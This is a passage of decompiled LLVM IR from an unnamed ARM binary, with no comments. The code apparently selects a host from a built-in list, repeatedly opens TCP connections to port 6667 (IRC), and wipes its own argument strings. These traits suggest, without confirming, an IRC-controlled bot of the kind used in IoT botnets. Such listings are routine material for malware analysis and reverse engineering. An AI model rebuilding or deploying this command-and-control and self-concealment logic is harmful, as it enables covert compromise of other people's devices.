  %v0_bb14 = load i32, i32* @r4, align 4
  %v3_bb14 = icmp ult i32 %v0_bb14, %v0_bb0c
  br i1 %v3_bb14, label %dec_label_pc_bb1c, label %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge

dec_label_pc_bb04.dec_label_pc_bb38_crit_edge:    ; preds = %dec_label_pc_bb04
  %.pre28 = add i32 %storemerge10, %v1_bab4
  %.pre29 = inttoptr i32 %.pre28 to i8*
  br label %dec_label_pc_bb38

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bb04
  %v2_bb28 = add i32 %storemerge10, %v1_bab4
  %v1_bb2c = inttoptr i32 %v2_bb28 to i8*
  %v2_bb2c = load i8, i8* %v1_bb2c, align 1
  %v7_bb30 = icmp eq i8 %v2_bb2c, 32
  br i1 %v7_bb30, label %dec_label_pc_bb38, label %dec_label_pc_baf8

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge
  %v3_bb4c.pre-phi = phi i8* [ %.pre29, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge ], [ %v1_bb2c, %dec_label_pc_bb1c ]
  store i8 0, i8* %v3_bb4c.pre-phi, align 1
  store i32 %v1_bab4, i32* @r0, align 4
  %v2_bb54 = call i32 @function_f730(i32 %v1_bab4)
  %v5_bb5c = trunc i32 %v2_bb54 to i8
  store i8 %v5_bb5c, i8* %stack_var_-40, align 1
  %v3_bb64 = icmp eq i8 %v5_bb5c, -1
  br i1 %v3_bb64, label %dec_label_pc_bb6c, label %dec_label_pc_bbc8

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_bb38
  %v2_bb70 = call i32 @function_f754(i32 %v1_bab4)
  %v2_bb80 = icmp eq i32 %v2_bb70, 0
  br i1 %v2_bb80, label %dec_label_pc_bb88, label %dec_label_pc_bba4

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb6c
  %v2_bb8c = load i32, i32* @global_var_1ad08.185, align 4
  store i32 %v2_bb8c, i32* @r2, align 4
  %v3_bb9c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_15e28.222 to i32))
  br label %dec_label_pc_bc24

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb6c
  %v2_bba4 = ptrtoint i8* %stack_var_-40 to i32
  %v1_bbac = add i32 %v2_bb70, 16
  %v2_bbac = inttoptr i32 %v1_bbac to i32*
  %v3_bbac = load i32, i32* %v2_bbac, align 4
  %v1_bbb0 = inttoptr i32 %v3_bbac to i32*
  %v2_bbb0 = load i32, i32* %v1_bbb0, align 4
  store i32 %v2_bbb0, i32* @r1, align 4
  %v1_bbb8 = add i32 %v2_bb70, 12
  %v2_bbb8 = inttoptr i32 %v1_bbb8 to i32*
  %v3_bbb8 = load i32, i32* %v2_bbb8, align 4
  store i32 %v2_bba4, i32* @r0, align 4
  store i32 %v3_bbb8, i32* @r2, align 4
  %v0_bbc4 = call i32 @function_ef60()
  %v2_bbd4.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bb38, %dec_label_pc_bba4
  %v12_bc2824 = phi i32 [ %v0_bbc4, %dec_label_pc_bba4 ], [ %v2_bb54, %dec_label_pc_bb38 ]
  %v2_bbd4 = phi i8 [ %v2_bbd4.pre, %dec_label_pc_bba4 ], [ %v5_bb5c, %dec_label_pc_bb38 ]
  store i8 %v2_bbd4, i8* bitcast (i8** @global_var_1847b.224 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_18478.33 to i8*), align 4
  store i32 256, i32* @global_var_1847c.35, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b984, %dec_label_pc_bab0, %dec_label_pc_ba44, %dec_label_pc_ba0c, %dec_label_pc_bb88, %dec_label_pc_bbc8
  %v12_bc28 = phi i32 [ 0, %dec_label_pc_ba44 ], [ %v4_ba34, %dec_label_pc_ba0c ], [ %v3_bb9c, %dec_label_pc_bb88 ], [ %v12_bc2824, %dec_label_pc_bbc8 ], [ %v0_bac4, %dec_label_pc_bab0 ], [ %v0_b998, %dec_label_pc_b984 ]
  ret i32 %v12_bc28

; uselistorder directives
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bad8, { 1, 0 }
  uselistorder i32 %v1_bab4, { 2, 4, 3, 0, 1, 5, 6 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_b9ac, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_18478.33, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_1847c.35, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_bc24, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bbc8, { 1, 0 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_ba88.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bab0, { 1, 0 }
  uselistorder label %dec_label_pc_b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_b95c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b984, { 1, 0 }
}

define i32 @function_bc40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bc40:
  %stack_var_-4 = alloca i32, align 4
  store i32 48204, i32* %stack_var_-4, align 4
  %v2_bc48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bc48, i32* @fp, align 4
  %v2_bc60 = load i32, i32* @global_var_1abf4.187, align 4
  store i32 %v2_bc60, i32* @r0, align 4
  %v0_bc68 = call i32 @function_fdcc()
  %v0_bc6c = call i32 @function_8688()
  store i32 %v0_bc6c, i32* @global_var_1abf4.187, align 4
  ret i32 %v0_bc6c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bc88(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bc88:
  %stack_var_-36 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bcbc

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bcd4
  %v1_bcb4 = add i32 %storemerge1, 1
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bcb0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_bc88 ], [ %v1_bcb4, %dec_label_pc_bcb0 ]
  store i32 %storemerge1, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bcc4 = call i32 @function_f030()
  %v0_bccc = load i32, i32* @r4, align 4
  %v3_bccc = icmp ult i32 %v0_bccc, %v0_bcc4
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge

dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge:    ; preds = %dec_label_pc_bcbc
  %.pre = add i32 %storemerge1, %arg2
  %.pre5 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bcf0

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcbc
  %v2_bce0 = add i32 %storemerge1, %arg2
  %v1_bce4 = inttoptr i32 %v2_bce0 to i8*
  %v2_bce4 = load i8, i8* %v1_bce4, align 1
  %v7_bce8 = icmp eq i8 %v2_bce4, 33
  br i1 %v7_bce8, label %dec_label_pc_bcf0, label %dec_label_pc_bcb0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge
  %v3_bd04.pre-phi = phi i8* [ %.pre5, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge ], [ %v1_bce4, %dec_label_pc_bcd4 ]
  store i8 0, i8* %v3_bd04.pre-phi, align 1
  %v2_bd0c = load i32, i32* @global_var_1abf4.187, align 4
  %v2_bd18 = inttoptr i32 %arg2 to i8*
  %v3_bd18 = call i32 @function_f464(i8* %v2_bd18, i32 %v2_bd0c)
  %v2_bd20 = icmp eq i32 %v3_bd18, 0
  br i1 %v2_bd20, label %dec_label_pc_bd28, label %dec_label_pc_bd7c

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bcf0
  %v3_bd28 = load i8*, i8** %stack_var_-36, align 4
  %v2_bd2c = load i8, i8* %v3_bd28, align 1
  %v7_bd30 = icmp eq i8 %v2_bd2c, 58
  br i1 %v7_bd30, label %dec_label_pc_bd38, label %dec_label_pc_bd44

dec_label_pc_bd38:                                ; preds = %dec_label_pc_bd28
  %v4_bd28 = ptrtoint i8* %v3_bd28 to i32
  %v1_bd3c = add i32 %v4_bd28, 1
  %v5_bd40 = inttoptr i32 %v1_bd3c to i8*
  store i8* %v5_bd40, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd28, %dec_label_pc_bd38
  %v3_bd643 = phi i8* [ %v3_bd28, %dec_label_pc_bd28 ], [ %v5_bd40, %dec_label_pc_bd38 ]
  %v2_bd48 = load i32, i32* @global_var_1abf4.187, align 4
  %v2_bd4c = icmp eq i32 %v2_bd48, 0
  br i1 %v2_bd4c, label %dec_label_pc_bd64, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd44
  store i32 %v2_bd48, i32* @r0, align 4
  %v0_bd60 = call i32 @function_fdcc()
  %v3_bd64.pre = load i8*, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bd54
  %v3_bd64 = phi i8* [ %v3_bd643, %dec_label_pc_bd44 ], [ %v3_bd64.pre, %dec_label_pc_bd54 ]
  %v4_bd64 = ptrtoint i8* %v3_bd64 to i32
  %v2_bd68 = call i32 @function_f4e0(i32 %v4_bd64)
  store i32 %v2_bd68, i32* @global_var_1abf4.187, align 4
  br label %dec_label_pc_bd7c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bd64
  %v12_bd80 = phi i32 [ %v3_bd18, %dec_label_pc_bcf0 ], [ %v2_bd68, %dec_label_pc_bd64 ]
  ret i32 %v12_bd80

; uselistorder directives
  uselistorder i8* %v3_bd28, { 0, 2, 1 }
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-36, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bd7c, { 1, 0 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
}

define i32 @function_bd88() local_unnamed_addr {
dec_label_pc_bd88:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_bd8c = load i32, i32* @fp, align 4
  store i32 48532, i32* %stack_var_-4, align 4
  %v2_bd90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd90, i32* @fp, align 4
  %v2_beb8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_bf24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_bf74 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_bd9c

dec_label_pc_bd9c:                                ; preds = %dec_label_pc_bd9c.backedge, %dec_label_pc_bd88
  store i32 -1, i32* @global_var_1abf8.25, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_bdb4 = load i32, i32* @global_var_18470.144, align 4
  %v2_bdb8 = icmp eq i32 %v2_bdb4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bdf4

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd9c
  %v0_bdc0 = call i32 @function_10364()
  %v2_bdcc = load i32, i32* @global_var_18024.232, align 4
  %v2_bdd8 = call i32 @function_cafc(i32 %v0_bdc0, i32 %v2_bdcc)
  %v4_bde8 = mul i32 %v2_bdd8, 4
  %v5_bde8 = add i32 %v4_bde8, ptrtoint ([16 x i8]** @global_var_18028.235 to i32)
  %v6_bde8 = inttoptr i32 %v5_bde8 to i32*
  %v7_bde8 = load i32, i32* %v6_bde8, align 4
  store i32 %v7_bde8, i32* @global_var_1ad00.142, align 4
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bd9c, %dec_label_pc_bdc0
  store i32 0, i32* @global_var_18470.144, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_be00, %dec_label_pc_bdf4
  %v3_be0c = call i32 @function_fc4c(i32 2, i32 1, i32 6)
  store i32 %v3_be0c, i32* @global_var_1abf8.25, align 4
  %v1_be24 = icmp slt i32 %v3_be0c, 0
  br i1 %v1_be24, label %dec_label_pc_be00, label %dec_label_pc_be2c

dec_label_pc_be2c:                                ; preds = %dec_label_pc_be00
  %v2_be30 = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_be30, i32* @r0, align 4
  %v1_be38 = call i32 @function_f730(i32 %v2_be30)
  %v2_be40 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be40, label %dec_label_pc_be64, label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be2c
  %v2_be4c = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_be4c, i32* @r0, align 4
  %v1_be54 = call i32 @function_f730(i32 %v2_be4c)
  %v3_be5c = icmp eq i32 %v1_be54, -1
  br i1 %v3_be5c, label %dec_label_pc_be64, label %dec_label_pc_bed8

dec_label_pc_be64:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be2c
  %v2_be68 = load i32, i32* @global_var_1ad00.142, align 4
  %v1_be70 = call i32 @function_f754(i32 %v2_be68)
  %v2_be80 = icmp eq i32 %v1_be70, 0
  br i1 %v2_be80, label %dec_label_pc_be88, label %dec_label_pc_bea8

dec_label_pc_be88:                                ; preds = %dec_label_pc_be64
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_be98 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_bea0 = call i32 @function_cbe4(i32 %v2_be98)
  br label %dec_label_pc_bd9c.backedge

dec_label_pc_bd9c.backedge:                       ; preds = %dec_label_pc_be88, %dec_label_pc_c058
  br label %dec_label_pc_bd9c

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be64
  %v1_beac = add i32 %v1_be70, 16
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %v1_beb0 = inttoptr i32 %v3_beac to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  %v1_bec0 = add i32 %v1_be70, 12
  %v2_bec0 = inttoptr i32 %v1_bec0 to i32*
  %v3_bec0 = load i32, i32* %v2_bec0, align 4
  store i32 %v3_bec0, i32* @r2, align 4
  %v3_bed0 = call i32 @function_ef50(i32 %v2_beb0, i32 %v2_beb8, i32 %v3_bec0)
  br label %dec_label_pc_bef0

dec_label_pc_bed8:                                ; preds = %dec_label_pc_be48
  %v2_bedc = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_bedc, i32* @r0, align 4
  %v1_bee4 = call i32 @function_f730(i32 %v2_bedc)
  store i32 %v1_bee4, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bea8, %dec_label_pc_bed8
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bf08 = call i32 @function_f604(i32 6667)
  %v2_bf20 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %v2_bf20, i32* @r3, align 4
  %v3_bf34 = call i32 @function_cd84(i32 %v2_bf20, i32 21537, i32 %v2_bf24)
  %v2_bf3c = call i32 @function_ce30(i32* null)
  br label %dec_label_pc_c038

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_c038
  %v0_bf4c = call i32 @function_cec4()
  %v2_bf58 = inttoptr i32 %v0_bf4c to i32*
  store i32 0, i32* %v2_bf58, align 4
  %v2_bf60 = load i32, i32* @global_var_1abf8.25, align 4
  %v4_bf74 = call i32 @function_fb64(i32 %v2_bf60, %sockaddr* %v3_bf74, i32 16)
  %v2_bf7c = icmp eq i32 %v4_bf74, 0
  br i1 %v2_bf7c, label %dec_label_pc_bf98, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf4c
  %v0_bf84 = call i32 @function_cec4()
  %v1_bf8c = inttoptr i32 %v0_bf84 to i32*
  %v2_bf8c = load i32, i32* %v1_bf8c, align 4
  %v7_bf90 = icmp eq i32 %v2_bf8c, 106
  br i1 %v7_bf90, label %dec_label_pc_bf98, label %dec_label_pc_c008

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf84, %dec_label_pc_bf4c
  %v2_bf9c = load i32, i32* @global_var_1abf8.25, align 4
  %v6_bfb8 = call i32 @function_fc1c(i32 %v2_bf9c, i32 1, i32 13, i32* null, i32 0)
  %v2_bfc0 = load i32, i32* @global_var_1abf8.25, align 4
  %v6_bfdc = call i32 @function_fc1c(i32 %v2_bfc0, i32 1, i32 2, i32* null, i32 0)
  %v2_bfe4 = load i32, i32* @global_var_1abf8.25, align 4
  %v6_c000 = call i32 @function_fc1c(i32 %v2_bfe4, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_bd8c, i32* @fp, align 4
  ret i32 %v6_c000

dec_label_pc_c008:                                ; preds = %dec_label_pc_bf84
  %v0_c008 = call i32 @function_cec4()
  %v1_c010 = inttoptr i32 %v0_c008 to i32*
  %v2_c010 = load i32, i32* %v1_c010, align 4
  %v7_c014 = icmp eq i32 %v2_c010, 115
  br i1 %v7_c014, label %dec_label_pc_c030, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_c008
  %v0_c01c = call i32 @function_cec4()
  %v1_c024 = inttoptr i32 %v0_c01c to i32*
  %v2_c024 = load i32, i32* %v1_c024, align 4
  %v7_c028 = icmp eq i32 %v2_c024, 114
  br i1 %v7_c028, label %dec_label_pc_c030, label %dec_label_pc_c058

dec_label_pc_c030:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c008
  %v1_c034 = call i32 @function_10b3c(i32 1)
  br label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_bef0, %dec_label_pc_c030
  %v2_c03c = call i32 @function_ce30(i32* null)
  %v2_c04c = sub i32 %v2_c03c, %v2_bf3c
  %tmp = icmp ult i32 %v2_c04c, 10
  br i1 %tmp, label %dec_label_pc_bf4c, label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c038
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_c068 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_c070 = call i32 @function_cbe4(i32 %v2_c068)
  br label %dec_label_pc_bd9c.backedge

; uselistorder directives
  uselistorder i32 %v3_bec0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @function_f604, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ef50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f754, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10364, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c038, { 1, 0 }
  uselistorder label %dec_label_pc_bef0, { 1, 0 }
  uselistorder label %dec_label_pc_bd9c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
}

define i32 @function_c094(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_c094:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-2644 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-1620 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-6740 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c098 = load i32, i32* @r4, align 4
  store i32 %v3_c098, i32* %stack_var_-20, align 4
  store i32 49312, i32* %stack_var_-4, align 4
  %v16_c098 = ptrtoint i32* %stack_var_-20 to i32
  %v2_c09c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c09c, i32* @fp, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_15ea8.238 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15070.39 to i32), i32* @r1, align 4
  %v3_c0d8 = call i32 @function_d050(i32 ptrtoint ([19 x i8]* @global_var_15ea8.238 to i32), i32 ptrtoint (i32* @global_var_15070.39 to i32))
  %v2_c0e8 = icmp eq i32 %v3_c0d8, 0
  br i1 %v2_c0e8, label %dec_label_pc_c0f0, label %dec_label_pc_c10c

dec_label_pc_c0f0:                                ; preds = %dec_label_pc_c094
  store i32 ptrtoint ([13 x i8]* @global_var_15ebc.241 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15070.39 to i32), i32* @r1, align 4
  %v3_c100 = call i32 @function_d050(i32 ptrtoint ([13 x i8]* @global_var_15ebc.241 to i32), i32 ptrtoint (i32* @global_var_15070.39 to i32))
  br label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c094, %dec_label_pc_c0f0
  %stack_var_-64.0 = phi i32 [ %v3_c100, %dec_label_pc_c0f0 ], [ %v3_c0d8, %dec_label_pc_c094 ]
  %stack_var_-68.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_15ebc.241, i32 0, i32 0), %dec_label_pc_c0f0 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_15ea8.238, i32 0, i32 0), %dec_label_pc_c094 ]
  %v2_c110 = icmp eq i32 %stack_var_-64.0, 0
  br i1 %v2_c110, label %dec_label_pc_c298, label %dec_label_pc_c118

dec_label_pc_c118:                                ; preds = %dec_label_pc_c10c
  %v2_c128 = load i32, i32* %arg2, align 4
  store i32 %v2_c128, i32* @r0, align 4
  %v0_c130 = call i32 @function_f030()
  %v2_c144 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c150 = bitcast i32* %stack_var_-332 to i8*
  %v3_c150 = call i32 @function_cc3c(i8* %v2_c150, i32 256)
  store i32 ptrtoint (i32* @global_var_15ecc.243 to i32), i32* @r1, align 4
  %v3_c160 = call i32 @function_f010(i8* %v2_c150, i32 ptrtoint (i32* @global_var_15ecc.243 to i32))
  %v2_c168 = icmp eq i32 %v3_c160, 0
  br i1 %v2_c168, label %dec_label_pc_c290, label %dec_label_pc_c180

dec_label_pc_c174:                                ; preds = %dec_label_pc_c180
  %v1_c178 = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_c180

dec_label_pc_c180:                                ; preds = %dec_label_pc_c118, %dec_label_pc_c174
  %stack_var_-60.0 = phi i32 [ %v1_c178, %dec_label_pc_c174 ], [ %v0_c130, %dec_label_pc_c118 ]
  %v2_c190 = load i32, i32* %arg2, align 4
  %v2_c198 = add i32 %v2_c190, %stack_var_-60.0
  %v1_c19c = inttoptr i32 %v2_c198 to i8*
  %v2_c19c = load i8, i8* %v1_c19c, align 1
  %v7_c1a0 = icmp eq i8 %v2_c19c, 47
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c174

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c180
  %v2_c1c4 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v2_c1c4, i32* @r0, align 4
  %v4_c1d8 = call i32 @function_d06c(i32 %v2_c1c4, i32 ptrtoint ([8 x i8]* @global_var_15ed0.245 to i32), i32 %v2_c144)
  %v1_c224 = inttoptr i32 %stack_var_-64.0 to i8*
  %v2_c1e0 = ptrtoint i32* %stack_var_-1620 to i32
  %v2_c204 = bitcast i32* %stack_var_-1620 to i8*
  br label %dec_label_pc_c220.outer

dec_label_pc_c1e0:                                ; preds = %dec_label_pc_c220
  %v3_c1f0 = call i32 @function_e7bc(i32 %v2_c1e0, i32 1024, i32 %stack_var_-64.0)
  %v3_c204 = call i32 @function_f464(i8* %v2_c204, i32 %v2_c1c4)
  %v2_c20c = icmp eq i32 %v3_c204, 0
  br i1 %v2_c20c, label %dec_label_pc_c214, label %dec_label_pc_c220

dec_label_pc_c214:                                ; preds = %dec_label_pc_c1e0
  %v1_c218 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_c220.outer

dec_label_pc_c220.outer:                          ; preds = %dec_label_pc_c214, %dec_label_pc_c1a8
  %stack_var_-56.0.ph = phi i32 [ %v1_c218, %dec_label_pc_c214 ], [ 0, %dec_label_pc_c1a8 ]
  br label %dec_label_pc_c220

dec_label_pc_c220:                                ; preds = %dec_label_pc_c220.outer, %dec_label_pc_c1e0
  %v2_c224 = call i32 @function_e738(i8* %v1_c224)
  %v2_c22c = icmp eq i32 %v2_c224, 0
  br i1 %v2_c22c, label %dec_label_pc_c1e0, label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c220
  %v2_c238 = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_c244 = call i32 @function_ced0(i8* %v1_c224)
  br i1 %v2_c238, label %dec_label_pc_c240, label %dec_label_pc_c298

dec_label_pc_c240:                                ; preds = %dec_label_pc_c234
  %v4_c248 = ptrtoint i8* %stack_var_-68.0 to i32
  store i32 %v4_c248, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15ed8.247 to i32), i32* @r1, align 4
  %v3_c250 = call i32 @function_d050(i32 %v4_c248, i32 ptrtoint (i32* @global_var_15ed8.247 to i32))
  %v2_c260 = icmp eq i32 %v3_c250, 0
  br i1 %v2_c260, label %dec_label_pc_c298, label %dec_label_pc_c268

dec_label_pc_c268:                                ; preds = %dec_label_pc_c240
  %v2_c274 = call i32 @function_e91c(i32 %v2_c1c4, i32 %v3_c250)
  %v1_c27c = inttoptr i32 %v3_c250 to i8*
  %v2_c27c = call i32 @function_ced0(i8* %v1_c27c)
  br label %dec_label_pc_c298

dec_label_pc_c290:                                ; preds = %dec_label_pc_c118
  %v1_c294 = inttoptr i32 %stack_var_-64.0 to i8*
  %v2_c294 = call i32 @function_ced0(i8* %v1_c294)
  br label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c240, %dec_label_pc_c10c, %dec_label_pc_c268, %dec_label_pc_c290
  %v0_c298 = call i32 @function_cc10()
  %v2_c2a0 = icmp eq i32 %v0_c298, 0
  br i1 %v2_c2a0, label %dec_label_pc_c2b0, label %dec_label_pc_c2a8

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c298
  %v1_c2ac = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_c2b0

dec_label_pc_c2b0:                                ; preds = %dec_label_pc_c298, %dec_label_pc_c2a8
  %v2_c2c0 = load i32, i32* %arg2, align 4
  store i32 %v2_c2c0, i32* @r4, align 4
  %v2_c2d4 = load i32, i32* %arg2, align 4
  store i32 %v2_c2d4, i32* @r0, align 4
  %v0_c2dc = call i32 @function_f030()
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15edc.249 to i32), i32* @r1, align 4
  %v4_c2f0 = call i32 @function_f1d0(i32 %v0_c2e4, i32 ptrtoint ([6 x i8]* @global_var_15edc.249 to i32), i32 %v0_c2dc)
  br label %dec_label_pc_c370

dec_label_pc_c300:                                ; preds = %dec_label_pc_c370
  %v3_c304 = mul i32 %storemerge11, 4
  %v2_c31c = add i32 %v3_c304, %tmp
  %v1_c320 = inttoptr i32 %v2_c31c to i32*
  %v2_c320 = load i32, i32* %v1_c320, align 4
  store i32 %v2_c320, i32* @r4, align 4
  %v2_c344 = load i32, i32* %v1_c320, align 4
  store i32 %v2_c344, i32* @r0, align 4
  %v0_c34c = call i32 @function_f030()
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c34c, i32* @r2, align 4
  %v2_c360 = inttoptr i32 %v0_c354 to i8*
  %v3_c360 = call i32 @function_ef70(i8* %v2_c360, i32 0)
  %v1_c368 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c2b0, %dec_label_pc_c300
  %storemerge11 = phi i32 [ 1, %dec_label_pc_c2b0 ], [ %v1_c368, %dec_label_pc_c300 ]
  %v5_c388 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_c388, label %dec_label_pc_c300, label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %dec_label_pc_c370
  %v2_c390 = call i32 @function_ce30(i32* null)
  store i32 %v2_c390, i32* @r4, align 4
  %v0_c398 = call i32 @function_cd2c()
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v2_c3a0 = xor i32 %v0_c3a0, %v0_c398
  store i32 %v2_c3a0, i32* @r4, align 4
